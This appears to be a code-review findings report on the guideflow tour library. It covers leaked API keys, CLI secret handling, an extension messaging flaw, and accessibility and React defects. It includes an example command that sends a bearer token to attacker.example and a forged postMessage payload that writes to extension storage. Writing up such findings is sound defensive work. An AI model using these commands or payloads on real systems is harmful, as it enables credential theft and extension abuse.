findings.title: Docs instruct users to inline their OpenAI/Anthropic API key into the client bundle; the documented baseURL proxy escape hatch does not exist
findings.evidence:
| `apiKey`    | `string` | —            | Your OpenAI API key |
| `model`     | `string` | `"gpt-4o"`   | Model identifier |
| `baseURL`   | `string` | OpenAI default | Override for custom endpoints / proxies |

```ts
const provider = new OpenAIProvider({
  apiKey: import.meta.env.VITE_OPENAI_KEY,
  model: 'gpt-4o-mini',
})
```
findings.impact: `import.meta.env.VITE_*` is statically inlined into the client bundle by Vite at build time — the recommended snippet ships a live, billable OpenAI secret key to every visitor, retrievable with View Source. The same pattern is repeated in apps/docs/guide/ai.md:29, apps/docs/api/ai/create-ai.md:43, apps/docs/guide/ai-generate.md:17, and with `VITE_ANTHROPIC_KEY` at apps/docs/api/ai/providers.md:57. Grepping every AI doc and packages/ai/README.md for `proxy|never expose|browser|server-side|Security` returns zero warnings. Worse, the documented mitigation is fiction: `OpenAIProviderOptions` (packages/ai/src/providers/openai.ts:15-24) declares only `apiKey | model | temperature | maxTokens` — there is no `baseURL` field — and `client()` at line 50 is `return new OpenAI({ apiKey: this.opts.apiKey });`, so a `baseURL` passed by a developer following the docs is silently dropped and traffic still goes to api.openai.com. `AnthropicProviderOptions` (packages/ai/src/providers/anthropic.ts:11-16) is identical: no `baseURL`, and line 40 is `return new Anthropic({ apiKey: this.opts.apiKey });`. Compounding the trap, neither client passes `dangerouslyAllowBrowser: true`, so the official OpenAI SDK throws at call time — the developer's only obvious workaround is to set that flag themselves, which is precisely the unsafe path. Net result: a developer following the documented happy path either gets a runtime crash or a leaked key, with no supported alternative.
findings.fix: Three changes. (1) Add `baseURL?: string` to `OpenAIProviderOptions`/`AnthropicProviderOptions` and forward it (`new OpenAI({ apiKey, baseURL: this.opts.baseURL })`) so a BYO-backend proxy is actually possible. (2) In both constructors, throw when `apiKey` is non-empty and `isBrowser()` is true, with a message pointing at the proxy pattern — force the safe path rather than documenting it. (3) Rewrite apps/docs/guide/ai.md, apps/docs/api/ai/providers.md, apps/docs/api/ai/create-ai.md and apps/docs/guide/ai-generate.md to remove every `import.meta.env.VITE_*_KEY` example and replace them with a `baseURL: '/api/ai-proxy'` example plus an explicit "never put a provider key in browser code" callout.
findings.verifierNote: providers.md:24-33 and :49-58 are verbatim, including the `baseURL` row and `apiKey: import.meta.env.VITE_OPENAI_KEY`. I confirmed the baseURL fiction: OpenAIProviderOptions (openai.ts:15-24) declares only apiKey|model|temperature|maxTokens, the constructor at 34-41 copies exactly those four, and client() at 50 is `return new OpenAI({ apiKey: this.opts.apiKey });`. AnthropicProviderOptions (anthropic.ts:11-16) is apiKey|model|maxTokens only and line 40 is `return new Anthropic({ apiKey: this.opts.apiKey });`. Grepping the AI markdown (ai.md, ai-generate.md, ai-chat.md, ai-intent.md, api/ai/*.md, packages/ai/README.md) for never expose|server-side|proxy|dangerouslyAllowBrowser|securit returns zero hits. Line numbers ai.md:29, ai-generate.md:17, create-ai.md:43 are exact. Downgrading to P1: this is a documentation defect plus a phantom option — the shipped code does not itself leak a key; a developer must build and deploy the documented snippet for the leak to occur.

findings.title: guideflow push forces the API key onto the command line; the documented env-var fallback is unreachable and the endpoint is unvalidated
findings.evidence:
.requiredOption('-k, --api-key <key>', 'API key (or set GUIDEFLOW_API_KEY env var)')
  .option('-e, --endpoint <url>', 'API endpoint', 'https://api.guideflow.dev/v1/flows')
findings.impact: Two defects compound. (1) The option is declared with `.requiredOption`, so commander aborts with `error: required option '-k, --api-key <key>' not specified` before the action callback ever runs — which means the `process.env['GUIDEFLOW_API_KEY']` fallback at line 35 (`const apiKey: string = opts.apiKey || process.env['GUIDEFLOW_API_KEY'] || '';`) is dead code and the help text's "(or set GUIDEFLOW_API_KEY env var)" is a lie. The only usable invocation is the one the docs print at apps/docs/guide/quick-start.md:95, `npx @guideflow/cli push my-tour.flow.json --api-key YOUR_KEY`, which writes the production secret into shell history and exposes it in `/proc/<pid>/cmdline` and `ps aux` to every local user and to any CI log that echoes the command. (2) `--endpoint` accepts any string with no scheme or host validation and is passed straight to `fetch` at line 53 with the header `'Authorization': 'Bearer ' + apiKey` at line 57, so `guideflow push flow.json -k $KEY -e http://attacker.example/collect` transmits the bearer token in cleartext over plain HTTP to an arbitrary host — a one-character typo or a malicious snippet in a README is enough to leak it.
findings.fix: Change `.requiredOption('-k, --api-key <key>', ...)` to `.option('-k, --api-key <key>', ...)` so the existing env-var fallback becomes reachable, and make the env var the documented primary path; when `--api-key` is passed on the command line, print a warning that the value is now in shell history. Reject non-HTTPS endpoints unless an explicit `--allow-insecure` flag is present: parse with `new URL(opts.endpoint)` and fail when `u.protocol !== 'https:'`. Update apps/docs/guide/quick-start.md:95 to use the env-var form.
findings.verifierNote: push.ts:24-25 is verbatim. Because commander's .requiredOption aborts in parse() before the .action callback, the fallback at line 35 `const apiKey: string = opts.apiKey || process.env['GUIDEFLOW_API_KEY'] || '';` and the guard at 36-39 are unreachable, and the flag's own help text '(or set GUIDEFLOW_API_KEY env var)' is therefore false. The documented invocation at apps/docs/guide/quick-start.md:95 is exactly `npx @guideflow/cli push my-tour.flow.json --api-key YOUR_KEY`, confirmed by reading the file. --endpoint (line 25) takes any string and is passed unvalidated to fetch at line 53 with `'Authorization': \`Bearer ${apiKey}\`` at line 57 — no scheme or host check anywhere in the file.

findings.title: Content script relays any page postMessage bearing the sentinel into the privileged chrome.runtime bus, giving pages a write primitive into chrome.storage
findings.impact: `BRIDGE_SOURCE` is the hardcoded string `'__gf_bridge__'` (line 31) — it is not a secret, it is published in the source and in the web-accessible bridge.js bundle. There is no allowlist on `type`, so any script on any page (the content script matches `<all_urls>`) can forge an arbitrary extension-internal message. Concretely, posting `{source:'__gf_bridge__', type:'GF_SAVE_FLOW', payload:{id:'x'+Math.random(), steps:[...]}}` is relayed verbatim to the background worker, which at packages/devtools/src/background/service-worker.ts:173-182 does `const key = 'gf_flow_' + (payload?.id ?? Date.now()); void chrome.storage.local.set({ [key]: {...payload, savedAt: Date.now()} })` — an unauthenticated, unbounded page-to-extension-storage write. Looping it exhausts the extension's storage quota (DoS), and it plants attacker-authored "saved tours" that the user sees in the popup's saved-tour list and can execute with one click (packages/devtools/src/popup/popup.tsx:303-311 `handleRunTour` reads the stored blob and sends `GF_START_TOUR` back into the page). Chained with the unescaped-`action` sink in @guideflow/core, a planted tour becomes script execution in whatever page the user next clicks Run on — a cross-origin jump, since the poisoned entry is stored extension-globally and is offered on every site. `GF_DELETE_FLOW` is reachable the same way (service-worker.ts:194-202) with guessable `gf_flow_<id>` keys, letting a page destroy the user's saved work. The reverse direction is equally open: `sendToBridge` at inspector.ts:88 is `window.postMessage({ source: CONTENT_SOURCE, ...msg }, '*')`, broadcasting panel commands to every listener on the page.
findings.fix: Add an explicit allowlist in the relay: `const RELAYABLE = new Set(['GF_DETECTED','GF_FLOWS_LIST','GF_TOUR_EVENT','GF_ACTIVE_TOUR_STATE']); if (!type || !RELAYABLE.has(type)) return;` before `chrome.runtime.sendMessage`. Independently, in the background worker, gate every storage-mutating type on provenance — `GF_SAVE_FLOW`/`GF_DELETE_FLOW` must only be honoured when `sender.tab === undefined` (i.e. from the panel/popup extension page), never when `sender.tab?.id` is set. Replace the shared-window postMessage channel entirely with a `MessageChannel` whose port is transferred once at bridge-injection time, or move the bridge into a MAIN-world script registered via `chrome.scripting.registerContentScripts({world:'MAIN'})` so no page-visible channel exists.
findings.verifierNote: inspector.ts:64-73 is verbatim; BRIDGE_SOURCE = '__gf_bridge__' at line 31 and bridge.js is a web_accessible_resource for <all_urls> (manifest.json:30-35), so the sentinel is public. There is no type allowlist in the relay. I confirmed the sink: service-worker.ts:173-182 handles GF_SAVE_FLOW with `const key = \`gf_flow_${payload?.id ?? Date.now()}\`` then `chrome.storage.local.set(...)` — the onMessage listener does not check sender.tab/sender.id or gate storage ops to the panel, so a content-script-relayed message from any page is honoured. GF_DELETE_FLOW at 194-202 takes an attacker-supplied `key`, and the panel's own delete uses the guessable `gf_flow_${id}` form (app.tsx:1109). popup.tsx:303-311 handleRunTour reads the stored blob and sends GF_START_TOUR to the tab, so planted entries are one click from execution. sendToBridge at inspector.ts:88 is `window.postMessage({ source: CONTENT_SOURCE, ...msg }, '*')` as quoted.

findings.title: ConversationalPanel removes the input focus ring, never announces AI replies, and claims aria-modal on a non-modal panel
findings.evidence:
style={{
            flex: 1,
            padding: '8px 12px',
            borderRadius: 6,
            border: '1px solid var(--gf-popover-border, rgba(0,0,0,.15))',
            fontSize: 13,
            fontFamily: 'inherit',
            background: 'transparent',
            color: 'inherit',
            outline: 'none',
          }}
findings.impact: Three defects in one component. (1) `outline: 'none'` with no replacement focus style means the sole text input in the panel has no visible focus indicator — a direct WCAG 2.4.7 (Focus Visible) failure on the component's primary control. (2) The message list at lines 135-157 and the `Thinking…` indicator at line 154 are plain divs with no `aria-live` region, so a screen-reader user who submits a question gets no notification when the assistant's answer arrives; they must blindly navigate back to find it. (3) The root sets `aria-modal="true"` (line 102) while the panel is a corner-docked, non-blocking widget with no overlay, no focus containment, and no Escape handler — the page behind stays fully interactive, so the attribute lies to AT and causes screen readers to hide the rest of the page from browse mode while it is open. The AI answer also triggers `scrollIntoView({ behavior: 'smooth' })` on every message (line 50) and on every highlighted element (line 79) with no reduced-motion guard.
findings.fix: Replace `outline: 'none'` with a `:focus-visible` outline using `--gf-accent-color`. Wrap the message list in `<div role="log" aria-live="polite" aria-relevant="additions">` and give the loading state `role="status"`. Remove `aria-modal="true"` (keep `role="dialog"` with `aria-label`), or make the panel genuinely modal with a focus trap and Escape-to-close. Gate both `scrollIntoView` calls on `prefers-reduced-motion`.
findings.verifierNote: All three verified at the cited lines. findings.title: dark.css is imported after themes.css at equal specificity, so dark mode silently destroys all five built-in themes
findings.evidence:
@import './themes.css';
@import './dark.css';
findings.impact: `themes.css` scopes each theme with an attribute selector — specificity (0,1,0) — e.g. `[data-gf-theme="bold"] { --gf-popover-bg: #1e1b4b; --gf-accent-color: #a78bfa; … }`. `dark.css:3` re-declares the same custom properties on `:root`, also specificity (0,1,0), inside `@media (prefers-color-scheme: dark)`. Equal specificity means source order decides, and dark.css is imported later, so on any machine with the OS set to dark mode every theme collapses to the same `#1e1e2e`/`#89b4fa` palette. The Bold, Glass, Brutalist, and Enterprise themes visually cease to exist for roughly half the user base, with no warning. The manual `[data-gf-dark]`/`.gf-dark` block at lines 15-24 has the same problem. Note also that `themes.css` never applies without `@guideflow/core/styles` being imported and `data-gf-theme` being set on `:root` — both undocumented.
findings.fix: Scope the dark declarations so they cannot outrank a theme: use `:root:not([data-gf-theme])` in the media query, or move dark.css before themes.css in index.css and give each theme block a dark variant. Add a visual regression story that renders each theme under `prefers-color-scheme: dark`.
findings.verifierNote: index.css:4-5 verbatim, and the specificity analysis is right for one placement: themes.css `[data-gf-theme="bold"]` and dark.css `:root` are both (0,1,0), so later source order wins — but only when both rules land on the SAME element, i.e. the attribute is on <html>. Custom properties inherit by proximity, so `data-gf-theme` on <body> (or any ancestor of the portalled popover) defines the value on a closer element and beats the inherited :root value from dark.css regardless of order. Since the attribute is undocumented everywhere, 'every theme collapses for half the user base' is unproven; it is a real cascade hazard for the root-element case only.

findings.title: overlayColor and animated spotlight options are documented and defaulted but never read

animated: options.animated ?? true,
      overlayColor: options.overlayColor ?? 'rgba(0,0,0,0)',

findings.title: Docs homepage advertises focus management, high-contrast and RTL 'out of the box' that the code does not implement
findings.evidence: details: ARIA roles, keyboard navigation, focus management, high-contrast mode, and RTL support out of the box.
findings.impact: Measured against the code: "focus management" is one `firstFocusable?.focus()` call in the core renderer and nothing at all in the React renderer, with no trap, no restoration, and no background inertness. "High-contrast mode" is a 38-line stylesheet that opts its own subtree out of forced colors and leaves the low-contrast opacity rules intact. "RTL support" is a 20-line stylesheet whose main rule double-flips the footer and whose second rule is a no-op, sitting on top of a placement engine with no direction awareness. "Keyboard navigation" is a document-level arrow-key handler that breaks typing in inputs. There is no accessibility page anywhere under apps/docs/guide/ to qualify any of it, and the automated a11y suite cannot execute. Buyers evaluating this library for a VPAT/EN 301 549 requirement will make a procurement decision on a claim that does not survive a single screen-reader pass — this is the most consequential documentation defect in the repo.
findings.fix: Soften the homepage feature card to what is actually true today, and add `apps/docs/guide/accessibility.md` stating the current conformance level honestly with a list of known gaps (focus trap, focus restore, live region, reduced motion) and a link to the tracking issues. Restore the stronger claim only once the P0 focus and announcement findings are fixed and covered by a working axe suite.
findings.verifierNote: apps/docs/index.md:42 is verbatim. Each of the four claims is falsified by findings I independently verified in this pass: focus management = one firstFocusable?.focus() in core and nothing in React; high-contrast = a 38-line sheet whose .gf-popover block sets forced-color-adjust:none and covers four selectors; RTL = a 20-line sheet whose main rule double-reverses the footer and whose hint-badge rule is a no-op, over a placement engine with no direction awareness; keyboard nav = an unguarded document-level arrow handler. No accessibility page exists under apps/docs/guide/, and the a11y e2e suite cannot execute.

findings.title: forced-color-adjust: none on .gf-popover opts the whole popover subtree out of the user's forced-colors palette
findings.impact: `forced-color-adjust: none` is inherited by descendants, so declaring it on the popover container disables the forced-colors override for every child. In Windows High Contrast the popover keeps author colours for its contents: `.gf-btn-ghost` and `.gf-popover-step-info` retain their `opacity: 0.45`/`0.5` dimming (2.5-3.6:1 against whatever background), `.gf-btn-secondary` keeps `color: inherit; opacity: .6`, and `.gf-progress-bar`/`.gf-progress-bar-fill` keep `#6366f1` on `rgba(0,0,0,.1)` — precisely the low-contrast rendering the user enabled forced colors to escape. The block also covers only four selectors; `.gf-btn-secondary`, `.gf-btn-ghost`, `.gf-progress-bar*`, `.gf-hint-badge`, `.gf-hint-tooltip`, `.gf-hotspot-tooltip`, and both spotlight elements are unhandled, and the spotlight's dimming is a `box-shadow` (spotlight.ts:201) which forced-colors mode suppresses — so in high contrast the tour loses its visual focus indicator entirely. The explicit `.gf-high-contrast` class block (lines 24-32) only overrides six tokens and likewise leaves every `opacity:` rule intact.
findings.fix: Remove `forced-color-adjust: none` from `.gf-popover` (keep it only on the specific decorative elements that need it, such as the beacon). Extend the `@media (forced-colors: active)` block to neutralise every `opacity` dimming (`opacity: 1`) and to give the progress bar and spotlight cutout an explicit `Highlight`/`CanvasText` outline so the focus indication survives. Add the same `opacity: 1` overrides to the `.gf-high-contrast` class block.
findings.verifierNote: high-contrast.css:2-7 verbatim; forced-color-adjust is an inherited property, so the whole popover subtree keeps author colours — the .gf-progress-bar #6366f1-on-rgba(0,0,0,.1) case is a genuine consequence, and the media block covers only four selectors. Two impact clauses are misattributed: `opacity` is never overridden by forced-colors mode in the first place, so btn-ghost/step-info/btn-secondary dimming would survive with or without this declaration; and .gf-btn-secondary's `color: inherit` resolves to CanvasText anyway. Spotlight box-shadow suppression (spotlight.ts:201) and the untouched opacity rules in the .gf-high-contrast block (24-32) check out. P2: forced-colors is a narrow mode and the popover text itself still renders on Canvas/CanvasText.

findings.title: Hotspot beacon is a 12px touch target whose tooltip body text is never exposed to assistive technology
findings.evidence:
width: var(--gf-hotspot-size, 12px);
  height: var(--gf-hotspot-size, 12px);
findings.impact: The `.gf-hotspot` container (lines 19-24) sets no dimensions, so it shrinks to its 12x12 beacon child — half the 24x24 CSS-px minimum required by WCAG 2.2 AA SC 2.5.8 (Target Size, Minimum), with no spacing exception since hotspots sit adjacent to real UI. Users with motor impairments cannot reliably hit it on touch. Separately, the tooltip is built as a child of the `role="button"` container (line 93 `beacon.appendChild(tooltip)`) with `role="tooltip"` and no `aria-describedby` linking it, while the container carries `aria-label` (line 156) — an explicit label that overrides subtree text in the accname/description computation. The result is that `options.body`, the actual explanatory content of the hotspot, is announced to nobody; a screen-reader user hears only the title. The tooltip is also CSS-revealed via `:hover`/`:focus-within` opacity only, so it is inert to AT regardless. `.gf-popover-close` has the same target-size problem: `padding:2px 6px; font-size:18px; line-height:1` computes to roughly 22x23px.
findings.fix: Give `.gf-hotspot` `min-width:24px; min-height:24px; display:grid; place-items:center` so the hit area meets 2.5.8 while the visual dot stays 12px; do the same for `.gf-popover-close` (`min-width:24px; min-height:24px`). Give the tooltip a generated id and set `aria-describedby` on the beacon container pointing at it, and drive visibility with a class toggled on focus/hover rather than opacity alone.
findings.verifierNote: hotspot.ts:26-27 verbatim; `.gf-hotspot` (19-24) sets only position/z-index/pointer-events/cursor, so the abs-positioned container shrink-wraps to the 12x12 beacon — under the 24x24 SC 2.5.8 minimum. Tooltip is appended into the role=button container (93) which carries aria-label at 156; role=button additionally has children-presentational, so the tooltip role is stripped and options.body is never exposed. The tooltip is revealed only by CSS :hover/:focus-within opacity (53-56) with pointer-events:none. Downgrading to P2: hotspots are a secondary, non-blocking surface, not the tour's critical path.

findings.title: i18n has no pluralisation, no Intl number/date formatting, no locale detection, no lazy loading, and ships only English
findings.impact: The whole i18n system is 64 lines. `String(v)` means "Step 2 of 5" renders Western Arabic digits in every locale — an Arabic (ar-EG) or Hindi (hi-IN) user sees ASCII numerals where `Intl.NumberFormat` would give ٢/٥ or २/५. There is no plural-category support (`Intl.PluralRules`), so a locale needing distinct forms for 1 vs 2 vs many steps cannot express them within the fixed `stepOf` template. `_locales` is seeded with exactly one entry, `['en', EN]` (line 29) — no locale packs ship with the package, so every consumer must hand-author all eight strings for every language. There is no `navigator.language` detection: the active locale defaults to `'en'` (line 30) and must be set manually. There is no async/lazy loading hook, so all translations must be bundled eagerly. Finally, two of the eight defined keys — `openHint` and `closeHint` — are dead: `grep -rn "openHint|closeHint" packages/*/src` finds them only in the interface and in demo registrations; neither `HintSystem` nor either renderer ever calls them, so `hint.ts:124` hardcodes English instead: `badge.setAttribute('aria-label', \`Hint ${number}: ${step.hint}\`)`, as does `hotspot.ts:156` `options.title ?? 'Guidance hint'`.
findings.fix: Format numeric vars with `new Intl.NumberFormat(this._active).format(v)` when `typeof v === 'number'`. Add optional `Intl.PluralRules` selection (`{ one, other }` value shapes). Ship at least a handful of locale packs under `@guideflow/core/locales/*` with a lazy `registerAsync(locale, loader)`. Add `detectLocale()` reading `navigator.languages`. Wire `openHint`/`closeHint` into `HintSystem._mount` and `HotspotManager._createBeacon` so the hint/hotspot labels are localisable at all.
findings.verifierNote: i18n/index.ts:44-51 verbatim; the file is 64 lines. `_locales = new Map([['en', EN]])` at 29 and `_active = 'en'` at 30 confirm the single shipped locale and absence of navigator.language detection; `String(v)` at 49 confirms no Intl.NumberFormat; the fixed 8-key Locale interface (6-15) with a single stepOf template confirms no plural-category support; no async/lazy hook exists. Dead keys verified: my grep for openHint|closeHint across packages/*/src and apps/demo/src hits only the interface (13-14), the EN const (24-25) and the demo registrations — hint.ts:124 hardcodes `Hint ${number}: ${step.hint}` and hotspot.ts:156 hardcodes `'Guidance hint'`, both confirmed at those exact lines.

findings.title: Popover placement math has no direction awareness — -start/-end placements are wrong in RTL
findings.impact: `-start` and `-end` are logical (writing-mode-relative) names taken from the CSS/floating-UI convention, where in RTL `start` means the inline-start = right edge. This implementation hardcodes `start` to the physical left edge (`x: tx`) and `end` to the physical right (`x: tx + tw - pw`) for all six `-start`/`-end` variants, and there is no `direction`/`dir` read anywhere in the file or the repo (`grep -rn "dir=\|direction" packages/core/src` finds nothing in the engine). In an RTL app every `bottom-start` popover anchors to the wrong edge of its target, so a popover intended to hug the leading edge of an Arabic toolbar button hangs off the trailing side, frequently overlapping the target it is supposed to point at. The fallback sequences (lines 10-22) are also physical: `left: ['left', 'right', …]` never mirrors, so RTL collision recovery flips toward the wrong side of the screen.
findings.fix: Read the effective direction once per compute (`getComputedStyle(targetElement).direction`) and, when `rtl`, swap the x-axis meaning of `-start`/`-end` and mirror the `left`/`right` entries in `FALLBACK_SEQUENCES`. Accept an optional `direction: 'ltr' | 'rtl'` parameter on `computePosition` so it stays pure and testable, and add RTL cases to `packages/core/src/__tests__/popover.test.ts`.
findings.verifierNote: popover.ts:46-48 verbatim; all six -start/-end variants hardcode physical edges (`x: tx` / `x: tx + tw - pw`) at lines 46-48, 51-54, and the -start/-end vertical variants at 57-66 likewise. No `dir`/`direction` read anywhere in the engine (grep clean), and FALLBACK_SEQUENCES (9-23) are physical. The logical-name convention claim is right (floating-ui resolves -start/-end against computed direction). Downgrading to P2: the popover still renders and is usable — it anchors to the mirror-image edge — so this is a layout-correctness gap in RTL, not a broken control.

findings.title: role=progressbar has no accessible name and no aria-valuetext, so it announces as a bare percentage
findings.evidence: <div class="gf-progress-bar" role="progressbar" aria-valuenow="${progressPct}" aria-valuemin="0" aria-valuemax="100">
findings.impact: `role="progressbar"` is in the WAI-ARIA "name from author" category — it requires `aria-label` or `aria-labelledby`, and has no content-based naming fallback. As written, a screen reader announces "67%, progress bar" with no indication of what is progressing. `aria-valuetext` is also absent, so the far more useful "Step 2 of 3" is never spoken through the widget; the equivalent text at line 183 is a plain `<span>` with no programmatic association. This is a WCAG 4.1.2 name failure on an interactive-role element. `packages/react/src/components/GuidePopover.tsx:141` is identical: `<div className="gf-progress-bar" role="progressbar" aria-valuenow={progressPct} aria-valuemin={0} aria-valuemax={100}>`.
findings.fix: Add `aria-label="${i18n.t('progressLabel')}"` (new i18n key, e.g. "Tour progress") and `aria-valuetext="${i18n.t('stepOf', { current: index + 1, total })}"` to both progressbar elements. Alternatively drop the ARIA role entirely and mark the bar `aria-hidden="true"` since the step-of text already conveys the information.
findings.verifierNote: default-renderer.ts:169 verbatim — role=progressbar with aria-valuenow/min/max and no aria-label/aria-labelledby/aria-valuetext. GuidePopover.tsx:141 is identical. progressbar is name-from-author with no content fallback, so the 4.1.2 analysis holds. Downgrading to P2: the equivalent 'Step N of M' text is present in the same dialog at line 183, so no information is actually unavailable to AT — the widget is redundant decoration rather than the sole carrier.

findings.title: Three Storybook 'theme' stories apply no theme and render identically to Default
findings.impact: `ThemeMinimal`, `ThemeBold`, and `ThemeGlass` each construct a bare `createGuideFlow()` with no configuration and never set `data-gf-theme` on any element — the only mechanism that activates a theme (`packages/core/src/styles/themes.css:2,13,25`). All three render pixel-identically to `Default`. Because `@chromatic-com/storybook` is wired up, these produce three visual-regression baselines that can never detect a theming regression, and any maintainer or evaluator browsing Storybook concludes the themes do nothing. Storybook is also the only place `@storybook/addon-a11y` runs, and the four stories cover only the happy path — no RTL story, no dark-mode story, no no-title-step story, and no reduced-motion story, so none of the a11y defects in this report surface there either.
findings.fix: Add a decorator that sets `document.documentElement.dataset.gfTheme` from a story arg (and cleans up on unmount), then parameterise the theme stories over all five values. Add stories for `dir="rtl"`, `prefers-color-scheme: dark` (Storybook's `globals` or a `colorScheme` parameter), and a step with `content.body` but no `content.title` so addon-a11y flags the dangling `aria-labelledby`.
findings.verifierNote: The quoted ThemeBold block is verbatim but at lines 85-89, not the cited 95 (line 96 is ThemeGlass). Substance holds: ThemeMinimal (74), ThemeBold (85) and ThemeGlass (96) each call bare createGuideFlow() with no config and never set data-gf-theme; preview.ts imports @guideflow/core/styles but sets no theme attribute and adds no decorator; exactly four stories exist, all happy-path. One overstatement: @chromatic-com/storybook is a devDependency in apps/storybook/package.json but is NOT registered in .storybook/main.ts's addons array, so the 'three visual-regression baselines' claim is not established. addon-a11y is registered.

findings.title: hints, progress, i18n, listFlows, configure, currentStep and currentContent are exposed by no adapter in any framework
findings.impact: Core's public surface includes `hints(steps)`, `showHints()`, `hideHints()`, `progress` (ProgressStore), `i18n` (I18nRegistry), `listFlows()`, `createFlow()`, `configure()`, `currentStep` and `currentContent`. Not one of these has a reactive or idiomatic binding in any of the three adapters: `useTour`/`useTour`(Vue)/`TourStore` all expose exactly four scalars and six methods. `currentStep`/`currentContent` in particular are only read inside `<GuidePopover>` (GuidePopover.tsx:57-64) and never returned from `useTour`, so a React user writing a custom popover has to re-subscribe to `step:enter` and read the imperative getters themselves — the very boilerplate the adapter exists to remove. Vue and Svelte users have no popover component and no `currentStep`, so building custom UI in those frameworks means reimplementing the adapter.
findings.fix: Add `currentStep` and `currentContent` to all three adapters' state (they are already refreshed on the same `step:enter` event that drives the existing scalars — one extra field per adapter). Add `useHints`/`useProgress` React hooks (and Vue/Svelte equivalents) or, at minimum, document explicitly in each guide that these live on the raw instance via `useGuideFlow()`/`store.instance`.
findings.verifierNote: The TourStore excerpt (svelte/src/index.ts:21-29) is verbatim. Downgrading to P2: every adapter does hand back the raw instance (useGuideFlow / plugin useGuideFlow / TourStore.instance at svelte index.ts:105), so this is missing ergonomics, not missing capability — 'exposed by no adapter' is accurate only in the reactive-binding sense the impact paragraph eventually concedes.

findings.title: pause/resume exist on GuideFlowInstance but no adapter surfaces them, and core exposes no isPaused getter to render against

findings.title: ConversationalPanel cannot abort in-flight AI requests, swallows the error object entirely, and stores highlights it never renders
findings.impact: Four defects in one component. (1) No abort: `await aiProp.chat(question)` (line 70) has no AbortSignal — and `GuideBrain.chat(question, root?)` (packages/ai/src/brain.ts:244) accepts none — so closing the panel or unmounting leaves an LLM request running, and its `setMessages` resolves into a discarded component; a user who asks three questions quickly gets three responses appended in nondeterministic completion order. (2) `err` is captured and never logged or surfaced, so a 401 from OpenAI, a CORS failure and a JSON parse error are indistinguishable — the developer sees only "Something went wrong" with no console trace. (3) `highlights` is written onto the message at line 73 (`highlights: answer.highlights ?? []`) and declared on the `Message` type (line 13), but the render loop at lines 136-152 only reads `msg.content` — the field is dead. (4) The comment `// Spotlight highlighted elements` at line 75 is false: the code only calls `el.scrollIntoView` in a `forEach`, so with multiple highlights every scroll but the last is immediately overridden, and the core `SpotlightOverlay` is never used.
findings.fix: Add an `AbortSignal` parameter to `GuideBrain.chat()` and thread it from an `AbortController` held in a ref, aborting in an unmount cleanup and before each new submit. Log `err` via console.error (or an `onError` prop) alongside the friendly message. findings.title: All React subscriptions read mutable engine state during render with plain useState — no useSyncExternalStore, so concurrent rendering can tear
findings.impact: Three problems that `useSyncExternalStore` (available since React 18, and the peer range's floor is React 17 only because of the untested claim above) exists precisely to solve. (1) The initial value is read from the mutable engine *during render*; under React 18/19 concurrent rendering an interrupted-and-resumed render tree can commit components that read different engine states, so two `useTour()` consumers can display different step numbers for the same step. (2) The subscription is installed in a passive `useEffect`, so any `step:enter` that fires between render and effect-flush is missed and the component shows stale state until the next event. (3) `setState` always allocates a fresh object literal, so there is no bail-out: every one of the five subscribed events re-renders every `useTour()` consumer, and since core emits `step:exit` then `step:enter` per navigation that is two full re-render passes per step for every call site. `GuidePopover`, `<TourStep>` and `useTourStep` share pattern (1) and (2).
findings.fix: Rewrite `useTour` on `useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot)` with a memoised snapshot (cache the object and return the previous reference when all four scalars are unchanged) so React can bail out. Export the subscribe/getSnapshot pair from the package so `useTourStep`, `TourStep` and `GuidePopover` can share it.
findings.verifierNote: use-tour.ts:41-46 is verbatim, the subscription is installed in a passive useEffect at 48-69, and setState always builds a fresh object literal — so sub-claim (3), two full re-render passes per navigation for every consumer, is straightforwardly true, and the pattern is repeated in GuidePopover/TourStep/useTourStep as claimed. Sub-claims (1) and (2) are real hazards but unproven here: tearing requires concurrent features the library never triggers itself, and the render-to-effect gap needs an event emitted between a consumer's render and its effect flush, which nothing in the codebase does. useSyncExternalStore is the right fix, but the headline 'concurrent rendering can tear' is speculative. Downgrading to P2.

findings.title: TourProvider snapshots `config` into a ref on first render and never applies later changes
findings.impact: `configRef` is initialised once and never updated, and `gf.configure()` is never called. A component that renders `<TourProvider config={{ debug: isDev, nonce: cspNonce, context: { userId } }}>` and later changes any of it — the overwhelmingly common case for `context.userId` after auth resolves — silently keeps the first value forever. Because `context.userId` is what core uses to gate persistence (`const userId = _config.context?.userId` in core/src/index.ts:243 and :323), a provider mounted before login permanently disables progress persistence and completion tracking with no warning. The prop's existence strongly implies it is live.
findings.fix: Add `useEffect(() => { if (!instance && config) gf.configure(config) }, [gf, instance, config])`, and document in TourProviderProps that `config` is applied via `configure()` on change (or, if the snapshot behaviour is intentional, rename the prop to `initialConfig` and say so in the JSDoc and in apps/docs/api/react/tour-provider.md).
findings.verifierNote: context.tsx:28 `const configRef = useRef(config)` is verbatim, there is no effect updating configRef.current, and `configure` is never called anywhere in packages/react/src. The persistence gating is exactly as cited: core/src/index.ts:243 `const userId = _config.context?.userId` in start() and :323 the same in _saveProgress(), both reading the closure config that only configure() mutates. Downgrading to P2: init-only provider config is a common (if undocumented) library convention, and the documented primary path in the README and docs is `<TourProvider instance={gf}>`, where the user holds the instance and can call gf.configure() — so this is a notable undocumented gap rather than a serious defect.

findings.title: TourProvider constructs the stateful engine inside useMemo, which React is documented to be allowed to discard
findings.impact: `useMemo` is a performance hint, not a semantic guarantee — React may throw away the cached value and re-run the factory (this already happens on every render under React 18/19 StrictMode dev double-invocation, producing a second `createGuideFlow()` whose `HotspotManager`, `HintSystem`, `ProgressStore` and `DefaultRenderer` are silently discarded without `destroy()`). If React drops the memo in production, a brand-new instance is handed to the context: every `useTour`/`useTourStep`/`GuidePopover` subscription re-binds to the fresh instance in its `[gf]`-keyed effect while the in-flight tour continues running on the abandoned one, so the UI freezes on the old step with no events arriving and no error. Because `<TourProvider config={...}>` is the documented no-instance path (JSDoc lines 20-25), this is the default for new users.
findings.fix: Replace `useMemo` with a lazy `useState` initializer (`const [gf] = useState(() => instance ?? createGuideFlow(configRef.current ?? {}))`) — state is a semantic guarantee — plus the destroy effect above. Guard against the StrictMode double-create by destroying the loser in the effect.
